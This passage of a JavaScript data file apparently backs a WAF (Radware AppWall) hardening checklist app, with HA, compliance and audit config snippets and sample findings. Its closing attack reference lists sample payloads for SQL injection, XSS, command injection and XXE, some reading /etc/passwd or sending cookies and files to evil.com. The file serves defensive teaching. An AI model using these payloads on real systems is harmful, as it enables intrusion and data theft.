                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">DevSecOps WAF Integration Process</h5>
                        <p class="mb-4 text-gray-700">WAF configuration lifecycle in a DevSecOps environment:</p>
                        <ol class="list-decimal pl-6 mb-4 text-gray-700">
                            <li class="mb-2"><strong>Configuration Development:</strong> WAF configurations created/modified as code in version control</li>
                            <li class="mb-2"><strong>Static Analysis:</strong> Configuration files checked for policy compliance and security</li>
                            <li class="mb-2"><strong>Testing Deployment:</strong> Changes deployed to development environment</li>
                            <li class="mb-2"><strong>Automated Testing:</strong> Security tests verify protection effectiveness</li>
                            <li class="mb-2"><strong>Staging Validation:</strong> Changes promoted to staging with production-like conditions</li>
                            <li class="mb-2"><strong>Production Deployment:</strong> Approved changes deployed to production</li>
                            <li><strong>Monitoring and Feedback:</strong> Continuous monitoring for effectiveness and false positives</li>
                        </ol>
                    `
                }
            ],
            tools: [
                {
                    title: 'Security Orchestration Platform',
                    icon: 'fa-cogs',
                    description: 'Platform for automating security response actions and workflows.',
                    link: 'https://www.paloaltonetworks.com/cortex/xsoar',
                    linkText: 'Cortex XSOAR'
                },
                {
                    title: 'WAF Configuration as Code',
                    icon: 'fa-code-branch',
                    description: 'Tools for managing WAF configurations as code in version control.',
                    link: 'https://github.com/features/actions',
                    linkText: 'GitHub Actions'
                },
                {
                    title: 'Threat Intelligence Platform',
                    icon: 'fa-satellite-dish',
                    description: 'Platform for consuming and applying threat intelligence to WAF policies.',
                    link: 'https://www.threatq.com/',
                    linkText: 'ThreatQuotient'
                },
                {
                    title: 'API Automation Tool',
                    icon: 'fa-exchange-alt',
                    description: 'Tool for automated interaction with WAF APIs for configuration and management.',
                    link: 'https://www.postman.com/',
                    linkText: 'Postman'
                }
            ]
        },
        {
            id: 'high-availability',
            title: '11. High Availability & Resilience',
            subtitle: 'Redundancy, failover, and disaster recovery configuration',
            icon: 'fa-heartbeat',
            priority: 'high',
            progress: 0,
            checklist: [
                {
                    title: '11.1 Cluster Configuration',
                    icon: 'fa-dice-d6',
                    items: [
                        { id: '11.1.1', text: 'Set up active-passive or active-active clustering', priority: 'critical' },
                        { id: '11.1.2', text: 'Configure cluster synchronization protocols', priority: 'high' },
                        { id: '11.1.3', text: 'Set up heartbeat and quorum configurations', priority: 'critical' },
                        { id: '11.1.4', text: 'Implement connection mirroring for failover', priority: 'high' },
                        { id: '11.1.5', text: 'Configure session persistence across cluster nodes', priority: 'medium' },
                        { id: '11.1.6', text: 'Set up configuration synchronization between nodes', priority: 'critical' }
                    ]
                },
                {
                    title: '11.2 Failover Configuration',
                    icon: 'fa-life-ring',
                    items: [
                        { id: '11.2.1', text: 'Configure automatic failover triggers and thresholds', priority: 'critical' },
                        { id: '11.2.2', text: 'Set up manual failover procedures and testing', priority: 'high' },
                        { id: '11.2.3', text: 'Implement failover notification and alerting', priority: 'high' },
                        { id: '11.2.4', text: 'Configure failure detection mechanisms', priority: 'critical' },
                        { id: '11.2.5', text: 'Set up network-level redundancy (VRRP, etc.)', priority: 'high' }
                    ]
                },
                {
                    title: '11.3 Disaster Recovery',
                    icon: 'fa-first-aid',
                    items: [
                        { id: '11.3.1', text: 'Create disaster recovery procedures and documentation', priority: 'critical' },
                        { id: '11.3.2', text: 'Configure geographically distributed redundancy', priority: 'high' },
                        { id: '11.3.3', text: 'Set up configuration backups and restoration', priority: 'critical' },
                        { id: '11.3.4', text: 'Implement DR testing and validation procedures', priority: 'high' },
                        { id: '11.3.5', text: 'Configure alternative traffic routing mechanisms', priority: 'medium' },
                        { id: '11.3.6', text: 'Set up recovery time objectives (RTO) monitoring', priority: 'medium' }
                    ]
                }
            ],
            techniques: [
                {
                    title: 'High Availability Cluster Configuration',
                    content: `
                        <p class="mb-4 text-gray-700">Configure AppWall in a high-availability cluster to ensure continuous protection and zero downtime.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure high availability cluster</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">system</span> high-availability</div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">mode</span> <span class="code-value">active-passive</span></div>
                            <div><span class="code-param">group-id</span> <span class="code-value">1</span></div>
                            <div><span class="code-param">priority</span> <span class="code-value">100</span></div>
                            <div><span class="code-param">sync-interface</span> <span class="code-value">eth3</span></div>
                            <div><span class="code-param">heartbeat-interface</span> <span class="code-value">eth3</span></div>
                            <div><span class="code-param">heartbeat-interval</span> <span class="code-value">1</span></div>
                            <div><span class="code-param">dead-interval</span> <span class="code-value">4</span></div>
                            <div class="code-comment"># Configure virtual addresses</div>
                            <div><span class="code-command">virtual-address</span> <span class="code-value">add</span> <span class="code-param">interface</span> <span class="code-value">eth1</span> <span class="code-param">address</span> <span class="code-value">203.0.113.100/24</span></div>
                            <div><span class="code-command">peer</span></div>
                            <div><span class="code-param">address</span> <span class="code-value">10.0.0.102</span></div>
                            <div><span class="code-param">authentication-key</span> <span class="code-value">"secure-ha-key"</span></div>
                            <div class="code-comment"># Configure synchronization</div>
                            <div><span class="code-command">sync</span></div>
                            <div><span class="code-param">config</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">sessions</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">interval</span> <span class="code-value">60</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">HA Cluster Modes Comparison</h5>
                        <p class="mb-4 text-gray-700">Different high availability modes with their advantages and trade-offs:</p>
                        <table class="w-full text-left border-collapse mb-6">
                            <thead>
                                <tr>
                                    <th class="p-3 border bg-gray-100">HA Mode</th>
                                    <th class="p-3 border bg-gray-100">Description</th>
                                    <th class="p-3 border bg-gray-100">Advantages</th>
                                    <th class="p-3 border bg-gray-100">Disadvantages</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td class="p-3 border">Active-Passive</td>
                                    <td class="p-3 border">One active node processes traffic; standby node takes over on failure</td>
                                    <td class="p-3 border">Simple configuration, clean failover, consistent performance</td>
                                    <td class="p-3 border">Idle hardware resources during normal operation</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Active-Active</td>
                                    <td class="p-3 border">Both nodes actively process traffic simultaneously</td>
                                    <td class="p-3 border">Efficient resource utilization, load balancing</td>
                                    <td class="p-3 border">More complex, potential for split-brain issues</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">N+1 Redundancy</td>
                                    <td class="p-3 border">Multiple active nodes with one or more shared standby nodes</td>
                                    <td class="p-3 border">Cost-effective for large deployments</td>
                                    <td class="p-3 border">Complex configuration, potential capacity issues during failure</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">N+N Redundancy</td>
                                    <td class="p-3 border">Full redundant set of nodes</td>
                                    <td class="p-3 border">Maximum resilience, no performance degradation during failure</td>
                                    <td class="p-3 border">Highest cost, complex synchronization</td>
                                </tr>
                            </tbody>
                        </table>
                    `
                },
                {
                    title: 'Failover Configuration',
                    content: `
                        <p class="mb-4 text-gray-700">Configure failover mechanisms to ensure seamless protection during hardware or software failures.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure failover settings</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">system</span> high-availability</div>
                            <div><span class="code-command">failover</span></div>
                            <div class="code-comment"># Automatic failover triggers</div>
                            <div><span class="code-param">auto-failover</span> <span class="code-value">enable</span></div>
                            <div><span class="code-command">trigger</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"interface-failure"</span></div>
                            <div><span class="code-command">trigger</span> <span class="code-value">"interface-failure"</span></div>
                            <div><span class="code-param">condition</span> <span class="code-value">interface-down</span></div>
                            <div><span class="code-param">interfaces</span> <span class="code-value">eth1,eth2</span></div>
                            <div><span class="code-param">consecutive-failures</span> <span class="code-value">3</span></div>
                            <div><span class="code-command">exit</span></div>
                            <div><span class="code-command">trigger</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"service-failure"</span></div>
                            <div><span class="code-command">trigger</span> <span class="code-value">"service-failure"</span></div>
                            <div><span class="code-param">condition</span> <span class="code-value">service-down</span></div>
                            <div><span class="code-param">services</span> <span class="code-value">appwall,http</span></div>
                            <div><span class="code-param">check-interval</span> <span class="code-value">5</span></div>
                            <div><span class="code-param">consecutive-failures</span> <span class="code-value">2</span></div>
                            <div><span class="code-command">exit</span></div>
                            <div class="code-comment"># Failover notification</div>
                            <div><span class="code-command">notifications</span></div>
                            <div><span class="code-param">email</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">recipients</span> <span class="code-value">waf-admins@example.com,oncall@example.com</span></div>
                            <div><span class="code-param">snmp-trap</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">syslog</span> <span class="code-value">enable</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">Failover Testing Procedures</h5>
                        <p class="mb-4 text-gray-700">Regular testing is critical to ensure failover functionality:</p>
                        <ol class="list-decimal pl-6 mb-4 text-gray-700">
                            <li class="mb-2"><strong>Scheduled Testing:</strong> Perform planned failover tests during maintenance windows</li>
                            <li class="mb-2"><strong>Interface Testing:</strong> Simulate network interface failures</li>
                            <li class="mb-2"><strong>Process Failure Testing:</strong> Simulate service/process failures</li>
                            <li class="mb-2"><strong>Power Failure Testing:</strong> Test complete power loss scenarios</li>
                            <li class="mb-2"><strong>Split-Brain Testing:</strong> Verify behavior during communication loss between nodes</li>
                            <li><strong>Recovery Testing:</strong> Validate automatic recovery when failed node returns</li>
                        </ol>
                    `
                },
                {
                    title: 'Disaster Recovery Planning',
                    content: `
                        <p class="mb-4 text-gray-700">Configure disaster recovery capabilities to ensure WAF protection even during catastrophic failures.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure disaster recovery</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">system</span> disaster-recovery</div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                            <div class="code-comment"># Configuration backup</div>
                            <div><span class="code-command">backup</span></div>
                            <div><span class="code-param">schedule</span> <span class="code-value">daily</span></div>
                            <div><span class="code-param">time</span> <span class="code-value">02:00</span></div>
                            <div><span class="code-param">retention</span> <span class="code-value">30</span></div>
                            <div><span class="code-param">location</span> <span class="code-value">s3</span></div>
                            <div><span class="code-param">s3-bucket</span> <span class="code-value">appwall-backups</span></div>
                            <div><span class="code-param">s3-region</span> <span class="code-value">us-east-1</span></div>
                            <div><span class="code-param">encryption</span> <span class="code-value">enable</span></div>
                            <div class="code-comment"># Geo-redundancy</div>
                            <div><span class="code-command">geo-redundancy</span></div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">primary-site</span> <span class="code-value">east</span></div>
                            <div><span class="code-param">secondary-site</span> <span class="code-value">west</span></div>
                            <div><span class="code-param">sync-mode</span> <span class="code-value">async</span></div>
                            <div><span class="code-param">sync-interval</span> <span class="code-value">300</span></div>
                            <div class="code-comment"># Recovery objectives</div>
                            <div><span class="code-param">rto</span> <span class="code-value">15</span></div>
                            <div><span class="code-param">rpo</span> <span class="code-value">5</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">Disaster Recovery Documentation</h5>
                        <p class="mb-4 text-gray-700">Essential elements of a comprehensive DR plan:</p>
                        <ul class="list-disc pl-6 mb-4 text-gray-700">
                            <li class="mb-2"><strong>Recovery Scope:</strong> Which applications and components are covered</li>
                            <li class="mb-2"><strong>Recovery Objectives:</strong> RTO (Recovery Time Objective) and RPO (Recovery Point Objective)</li>
                            <li class="mb-2"><strong>Team Responsibilities:</strong> Clear roles and responsibilities during a disaster</li>
                            <li class="mb-2"><strong>Communication Plan:</strong> How to communicate during the event</li>
                            <li class="mb-2"><strong>Recovery Procedures:</strong> Step-by-step instructions for restoring services</li>
                            <li class="mb-2"><strong>Escalation Procedures:</strong> When and how to escalate issues</li>
                            <li class="mb-2"><strong>Testing Schedule:</strong> Regular validation of the recovery plan</li>
                            <li><strong>Documentation Maintenance:</strong> Process for keeping the plan updated</li>
                        </ul>
                    `
                }
            ],
            tools: [
                {
                    title: 'Failover Testing Tool',
                    icon: 'fa-toggle-on',
                    description: 'Tool for testing and validating failover functionality.',
                    link: 'https://www.radware.com/products/appwall/',
                    linkText: 'AppWall Tools'
                },
                {
                    title: 'Cluster Monitoring',
                    icon: 'fa-heartbeat',
                    description: 'Monitor cluster health and synchronization status.',
                    link: 'https://www.nagios.org/',
                    linkText: 'Nagios'
                },
                {
                    title: 'Configuration Backup Manager',
                    icon: 'fa-save',
                    description: 'Tool for managing and automating configuration backups.',
                    link: 'https://www.radware.com/products/appwall/',
                    linkText: 'Backup Tools'
                },
                {
                    title: 'DR Testing Framework',
                    icon: 'fa-clipboard-check',
                    description: 'Framework for conducting and documenting DR tests.',
                    link: 'https://github.com/linkedin/dr-elephant',
                    linkText: 'DR Framework'
                }
            ]
        },
        {
            id: 'compliance',
            title: '12. Compliance & Governance',
            subtitle: 'Regulatory compliance and security policy management',
            icon: 'fa-balance-scale',
            priority: 'medium',
            progress: 25,
            checklist: [
                {
                    title: '12.1 Compliance Configuration',
                    icon: 'fa-clipboard-check',
                    items: [
                        { id: '12.1.1', text: 'Configure PCI DSS compliance settings', priority: 'high' },
                        { id: '12.1.2', text: 'Set up GDPR compliance controls', priority: 'high' },
                        { id: '12.1.3', text: 'Implement HIPAA security requirements', priority: 'high' },
                        { id: '12.1.4', text: 'Configure OWASP Top 10 protections', priority: 'critical' },
                        { id: '12.1.5', text: 'Set up compliance reporting and documentation', priority: 'medium' }
                    ]
                },
                {
                    title: '12.2 Audit & Documentation',
                    icon: 'fa-file-alt',
                    items: [
                        { id: '12.2.1', text: 'Configure compliance audit logging', priority: 'high' },
                        { id: '12.2.2', text: 'Set up configuration change tracking', priority: 'medium' },
                        { id: '12.2.3', text: 'Implement administrative access auditing', priority: 'high' },
                        { id: '12.2.4', text: 'Document security policy justifications', priority: 'medium' },
                        { id: '12.2.5', text: 'Create WAF configuration documentation', priority: 'medium' },
                        { id: '12.2.6', text: 'Set up regular configuration reviews', priority: 'high' }
                    ]
                },
                {
                    title: '12.3 Policy Management',
                    icon: 'fa-tasks',
                    items: [
                        { id: '12.3.1', text: 'Configure policy inheritance and hierarchy', priority: 'medium' },
                        { id: '12.3.2', text: 'Set up environment-specific policies (dev/test/prod)', priority: 'high' },
                        { id: '12.3.3', text: 'Implement policy approval workflows', priority: 'medium' },
                        { id: '12.3.4', text: 'Configure policy templates for new applications', priority: 'medium' },
                        { id: '12.3.5', text: 'Set up regular policy effectiveness reviews', priority: 'high' },
                        { id: '12.3.6', text: 'Document policy exceptions with justifications', priority: 'medium' }
                    ]
                }
            ],
            techniques: [
                {
                    title: 'PCI DSS Compliance Configuration',
                    content: `
                        <p class="mb-4 text-gray-700">Configure WAF protections to meet Payment Card Industry Data Security Standard (PCI DSS) requirements.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure PCI DSS compliance settings</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">compliance</span></div>
                            <div><span class="code-command">pci-dss</span></div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">version</span> <span class="code-value">4.0</span></div>
                            <div class="code-comment"># PCI DSS 6.6 WAF Requirements</div>
                            <div><span class="code-command">requirement</span> <span class="code-value">6.6</span></div>
                            <div><span class="code-param">attack-signatures</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">protocol-compliance</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">bot-protection</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">injection-protection</span> <span class="code-value">enable</span></div>
                            <div class="code-comment"># PCI DSS 10.2 Logging Requirements</div>
                            <div><span class="code-command">requirement</span> <span class="code-value">10.2</span></div>
                            <div><span class="code-param">log-administrative-actions</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">log-security-events</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">log-access-to-cardholder-data</span> <span class="code-value">enable</span></div>
                            <div class="code-comment"># Cardholder data protection</div>
                            <div><span class="code-command">cardholder-data</span></div>
                            <div><span class="code-param">credit-card-masking</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">detection-patterns</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">block-card-exfiltration</span> <span class="code-value">enable</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">PCI DSS Requirements for WAF</h5>
                        <p class="mb-4 text-gray-700">Key PCI DSS requirements that involve WAF protection:</p>
                        <table class="w-full text-left border-collapse mb-6">
                            <thead>
                                <tr>
                                    <th class="p-3 border bg-gray-100">Requirement</th>
                                    <th class="p-3 border bg-gray-100">Description</th>
                                    <th class="p-3 border bg-gray-100">WAF Implementation</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td class="p-3 border">6.6</td>
                                    <td class="p-3 border">Protect public-facing web applications against attacks</td>
                                    <td class="p-3 border">Deploy WAF with comprehensive attack protection</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">6.2</td>
                                    <td class="p-3 border">Establish a process to identify security vulnerabilities</td>
                                    <td class="p-3 border">Virtual patching for known vulnerabilities</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">10.2</td>
                                    <td class="p-3 border">Implement automated audit trails</td>
                                    <td class="p-3 border">Comprehensive security event logging</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">10.6</td>
                                    <td class="p-3 border">Review logs and security events</td>
                                    <td class="p-3 border">Security event monitoring and alerting</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">11.4</td>
                                    <td class="p-3 border">Use intrusion detection/prevention techniques</td>
                                    <td class="p-3 border">WAF attack detection and blocking</td>
                                </tr>
                            </tbody>
                        </table>
                    `
                },
                {
                    title: 'Security Audit Configuration',
                    content: `
                        <p class="mb-4 text-gray-700">Configure comprehensive audit logging to track security-relevant activities and changes.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure security auditing</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">auditing</span></div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                            <div class="code-comment"># Configuration change auditing</div>
                            <div><span class="code-command">config-changes</span></div>
                            <div><span class="code-param">tracking</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">approval-workflow</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">change-justification</span> <span class="code-value">required</span></div>
                            <div><span class="code-param">notification</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">notification-recipients</span> <span class="code-value">security-admins@example.com</span></div>
                            <div class="code-comment"># Administrative access auditing</div>
                            <div><span class="code-command">admin-access</span></div>
                            <div><span class="code-param">login-tracking</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">session-recording</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">command-logging</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">failed-login-notification</span> <span class="code-value">enable</span></div>
                            <div class="code-comment"># Audit log protection</div>
                            <div><span class="code-command">log-security</span></div>
                            <div><span class="code-param">integrity-protection</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">read-only-access</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">retention</span> <span class="code-value">365</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">Audit Log Review Process</h5>
                        <p class="mb-4 text-gray-700">Establish a systematic approach for reviewing security audit logs:</p>
                        <ol class="list-decimal pl-6 mb-4 text-gray-700">
                            <li class="mb-2"><strong>Daily Review:</strong> Check critical security events and administrative actions</li>
                            <li class="mb-2"><strong>Weekly Review:</strong> Analyze configuration changes and policy modifications</li>
                            <li class="mb-2"><strong>Monthly Review:</strong> Examine trends, patterns, and potential improvements</li>
                            <li class="mb-2"><strong>Quarterly Review:</strong> Conduct comprehensive audit of security controls</li>
                            <li class="mb-2"><strong>Anomaly Investigation:</strong> Prompt investigation of unexpected activities</li>
                            <li><strong>Documentation:</strong> Record all reviews, findings, and actions taken</li>
                        </ol>
                    `
                },
                {
                    title: 'Policy Lifecycle Management',
                    content: `
                        <p class="mb-4 text-gray-700">Implement structured processes for managing the lifecycle of security policies.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure policy management</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">policy-management</span></div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                            <div class="code-comment"># Policy templates</div>
                            <div><span class="code-command">templates</span></div>
                            <div><span class="code-command">template</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"standard-web-application"</span></div>
                            <div><span class="code-command">template</span> <span class="code-value">"standard-web-application"</span></div>
                            <div><span class="code-param">description</span> <span class="code-value">"Baseline protection for standard web applications"</span></div>
                            <div><span class="code-param">sensitivity</span> <span class="code-value">medium</span></div>
                            <div><span class="code-param">base-policy</span> <span class="code-value">"Web-Portal"</span></div>
                            <div><span class="code-command">exit</span></div>
                            <div class="code-comment"># Environment-specific policies</div>
                            <div><span class="code-command">environments</span></div>
                            <div><span class="code-command">environment</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"development"</span></div>
                            <div><span class="code-command">environment</span> <span class="code-value">"development"</span></div>
                            <div><span class="code-param">learning-mode</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">block-mode</span> <span class="code-value">disable</span></div>
                            <div><span class="code-command">exit</span></div>
                            <div><span class="code-command">environment</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"production"</span></div>
                            <div><span class="code-command">environment</span> <span class="code-value">"production"</span></div>
                            <div><span class="code-param">learning-mode</span> <span class="code-value">disable</span></div>
                            <div><span class="code-param">block-mode</span> <span class="code-value">enable</span></div>
                            <div class="code-comment"># Approval workflow</div>
                            <div><span class="code-command">approval-workflow</span></div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">approvers</span> <span class="code-value">security-team@example.com</span></div>
                            <div><span class="code-param">expiration</span> <span class="code-value">72</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">Policy Lifecycle Stages</h5>
                        <p class="mb-4 text-gray-700">The complete lifecycle of WAF security policies:</p>
                        <table class="w-full text-left border-collapse mb-6">
                            <thead>
                                <tr>
                                    <th class="p-3 border bg-gray-100">Stage</th>
                                    <th class="p-3 border bg-gray-100">Activities</th>
                                    <th class="p-3 border bg-gray-100">Responsible Parties</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td class="p-3 border">Policy Creation</td>
                                    <td class="p-3 border">Define baseline protection requirements, select templates, customize rules</td>
                                    <td class="p-3 border">Security Engineer, Application Owner</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Policy Review</td>
                                    <td class="p-3 border">Technical review, security assessment, compliance verification</td>
                                    <td class="p-3 border">Security Architect, Compliance Officer</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Policy Approval</td>
                                    <td class="p-3 border">Formal approval process, documentation of justifications</td>
                                    <td class="p-3 border">Security Manager, Application Owner</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Policy Deployment</td>
                                    <td class="p-3 border">Staged rollout (dev → test → prod), monitoring for issues</td>
                                    <td class="p-3 border">Security Engineer, Operations Team</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Policy Tuning</td>
                                    <td class="p-3 border">False positive reduction, performance optimization</td>
                                    <td class="p-3 border">Security Engineer, Application Support</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Policy Review</td>
                                    <td class="p-3 border">Regular effectiveness reviews, coverage assessment</td>
                                    <td class="p-3 border">Security Engineer, Application Owner</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Policy Retirement</td>
                                    <td class="p-3 border">Decommissioning process, documentation archiving</td>
                                    <td class="p-3 border">Security Engineer, Application Owner</td>
                                </tr>
                            </tbody>
                        </table>
                    `
                }
            ],
            tools: [
                {
                    title: 'Compliance Scanner',
                    icon: 'fa-clipboard-check',
                    description: 'Tool for scanning WAF configurations against compliance requirements.',
                    link: 'https://www.rapid7.com/products/insightvm/',
                    linkText: 'Rapid7'
                },
                {
                    title: 'Security Policy Manager',
                    icon: 'fa-tasks',
                    description: 'Platform for managing and tracking security policy lifecycle.',
                    link: 'https://www.radware.com/products/appwall/',
                    linkText: 'Policy Manager'
                },
                {
                    title: 'Audit Log Analyzer',
                    icon: 'fa-search',
                    description: 'Tool for analyzing and reporting on security audit logs.',
                    link: 'https://www.splunk.com/en_us/software/enterprise-security.html',
                    linkText: 'Splunk Enterprise Security'
                },
                {
                    title: 'Documentation Generator',
                    icon: 'fa-file-alt',
                    description: 'Tool for automatically generating security configuration documentation.',
                    link: 'https://www.radware.com/products/appwall/',
                    linkText: 'Documentation Tools'
                }
            ]
        }
    ],
    
    // Sample findings data for demonstration
    findings: [
        {
            id: 'finding-001',
            category: 'deployment',
            title: 'Missing Access Controls for Management Interface',
            severity: 'high',
            description: 'The AppWall management interface is not properly secured with IP-based access controls, allowing connections from any source IP address. This increases the risk of unauthorized access to the WAF administration interface.',
            remediation: 'Implement IP-based access controls to restrict management access to authorized administration networks only. Ensure management access is only available over encrypted channels (HTTPS/SSH).',
            config: `# Restrict management access to specific networks
configure terminal
system administration
ssh allowed-networks 10.0.0.0/24 192.168.10.0/24
gui allowed-networks 10.0.0.0/24 192.168.10.0/24
commit
exit`
        },
        {
            id: 'finding-002',
            category: 'signatures',
            title: 'Outdated Attack Signatures',
            severity: 'medium',
            description: 'The AppWall is using outdated attack signatures that do not protect against recent vulnerabilities. Attack signature updates have not been applied for more than 30 days.',
            remediation: 'Update attack signatures to the latest version and configure automatic signature updates to occur at least weekly.',
            config: `# Configure automatic signature updates
configure terminal
appwall
signatures auto-update enable
signatures update-schedule daily
signatures update-time 01:00
commit
exit`
        },
        {
            id: 'finding-003',
            category: 'signatures',
            title: 'Excessive Signature Exceptions',
            severity: 'medium',
            description: 'Multiple global signature exceptions have been configured, potentially allowing malicious requests that would otherwise be blocked.',
            remediation: 'Review all signature exceptions and remove any unnecessary exclusions. Configure more specific, targeted exceptions where required instead of broad exclusions.',
            config: `# Review and remove excessive signature exceptions
configure terminal
appwall
policy "Web-Portal"
signatures show-exceptions
signatures remove-exception id 12345
commit
exit`
        },
        {
            id: 'finding-004',
            category: 'threat-protection',
            title: 'Bot Protection Not Enabled',
            severity: 'low',
            description: 'Advanced bot detection features are available but not enabled. The application may be vulnerable to scraping, credential stuffing, and other automated attacks.',
            remediation: 'Enable bot protection features with appropriate settings based on application requirements.',
            config: `# Enable bot protection
configure terminal
appwall
policy "Web-Portal"
bot-protection
state enable
detection-level medium
captcha-protection enable
rate-limiting enable
commit
exit`
        }
    ],
    
    // Reference data for attacks and protections
    attackTypes: {
        'sql-injection': {
            name: 'SQL Injection',
            description: 'Attackers insert malicious SQL code into application inputs to manipulate database queries.',
            examples: [
                "' OR 1=1 --",
                "'; DROP TABLE users; --",
                "' UNION SELECT username, password FROM users --"
            ],
            evasionTechniques: [
                'Encoding (URL, double, hex)',
                'Case alteration (SeLeCt)',
                'Comment injection (/**/)',
                'Alternate equivalents (char() instead of strings)',
                'Whitespace manipulation'
            ],
            protection: [
                'Input validation and sanitization',
                'Parameterized queries',
                'Least privilege database accounts',
                'WAF signatures for SQL patterns',
                'Application behavior monitoring'
            ]
        },
        'xss': {
            name: 'Cross-Site Scripting (XSS)',
            description: 'Attackers inject malicious JavaScript code into web pages, which executes in victim browsers.',
            examples: [
                "< script>alert('XSS')< /script>",
                "< img src=\"x\" onerror=\"alert('XSS')\">",
                "< body onload=\"fetch('https://evil.com?c='+document.cookie)\">"
            ],
            evasionTechniques: [
                'Encoding (HTML, JavaScript, URL, base64)',
                'Script obfuscation techniques',
                'Event handler variations',
                'Protocol-agnostic requests (//evil.com)',
                'Template injection'
            ],
            protection: [
                'Output encoding for context',
                'Content-Security-Policy headers',
                'Input validation',
                'XSS-specific WAF rules',
                'Modern framework protections'
            ]
        },
        'command-injection': {
            name: 'Command Injection',
            description: 'Attackers execute unauthorized system commands through vulnerable application inputs.',
            examples: [
                "; cat /etc/passwd",
                "| ls -la",
                "`whoami`",
                "$(id)"
            ],
            evasionTechniques: [
                'Command chaining (&&, ||, ;)',
                'Alternate encoding (hex, octal)',
                'Variable substitution',
                'Inline execution $(), ``',
                'Whitespace alternatives (${IFS})'
            ],
            protection: [
                'Input validation and sanitization',
                'Avoid system command execution',
                'Command whitelisting',
                'WAF signatures for command patterns',
                'Runtime application monitoring'
            ]
        },
        'xxe': {
            name: 'XML External Entity (XXE)',
            description: 'Attackers exploit vulnerable XML parsers to access files or execute code.',
            examples: [
                "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
                "<!DOCTYPE data [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY exfil SYSTEM 'http://evil.com/?x=%file;'>\">%eval;]><data>&exfil;</data>"
            ],
            evasionTechniques: [
                'Parameter entities',
                'Out-of-band data retrieval',
                'XML namespace abuse',
                'Custom entity definitions',
